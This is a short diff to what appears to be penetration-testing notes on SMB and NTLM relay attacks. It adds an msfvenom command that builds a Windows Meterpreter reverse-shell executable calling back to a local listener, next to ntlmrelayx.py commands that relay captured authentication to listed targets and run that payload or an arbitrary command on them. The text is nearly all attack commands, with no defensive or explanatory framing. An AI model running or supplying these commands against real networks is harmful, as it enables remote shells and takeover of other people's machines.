@@ -87,6 +87,10 @@ help
 shares
 use C$
 
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.27 lport=4444 -f exe -o smb.exe
+
 ntlmrelayx.py -tf targets.txt -smb2support -e meterpreter.exe (msfvenom payload)
+
+
 ntlmrelayx.py -tf targets.txt -smb2support -c "command"
 
